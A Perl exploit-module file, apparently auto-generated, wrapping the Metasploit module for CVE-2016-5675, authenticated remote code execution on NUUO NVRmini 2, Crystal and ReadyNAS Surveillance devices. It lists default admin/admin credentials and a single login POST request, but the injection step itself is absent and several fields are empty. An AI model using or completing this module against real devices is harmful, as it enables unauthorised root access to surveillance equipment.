package NUUO::MSF::NuuoNvrminiAuthRce;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "NuuoNvrminiAuthRce";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "CVE" => "CVE-2016-5675",
  "DESCRIPTION" => "

        The NVRmini 2 Network Video Recorder, Crystal NVR and the ReadyNAS Surveillance application are vulnerable

        to an authenticated remote code execution on the exposed web administration interface. An administrative

        account is needed to exploit this vulnerability.

        This results in code execution as root in the NVRmini and the 'admin' user in ReadyNAS.

        This exploit has been tested on several versions of the NVRmini 2, Crystal and the ReadyNAS Surveillance.

        It probably also works on the NVRsolo and other Nuuo devices, but it has not been tested

        in those devices.

      ",
  "METHOD" => "POST",
  "MSF_MODULE" => "nuuo_nvrmini_auth_rce",
  "PASSWORD FOR THE SPECIFIED USERTITLE" => "admin",
  "PAYLOAD" => "user=__USER__&pass=__PASS__&submit=Login&",
  "REFERENCES" => [
    "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/nuuo-nvr-vulns.txt",
    "http://seclists.org/bugtraq/2016/Aug/45",
  ],
  "THE USERTITLE TO LOGIN AS" => "admin",
  "TITLE" => "NUUO NVRmini 2 / Crystal / NETGEAR ReadyNAS Surveillance Authenticated Remote Code Execution",
  VARIABLES => {
    'USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'USER' =>       { DESCRIPTION => "", VALUE => "" },
    'TARGETURI' =>       { DESCRIPTION => "", VALUE => "" },
    'PASSWORD' =>       { DESCRIPTION => "", VALUE => "" },
    'PASS' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT4 => {
      METHOD       => 'POST',
      PATH   => 'login.php',
      PAYLOAD      => 'user=__USERNAME__&pass=__PASSWORD__&submit=Login',
      TEXT   => 'Sending Exploit #4 Request : [POST] /login.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
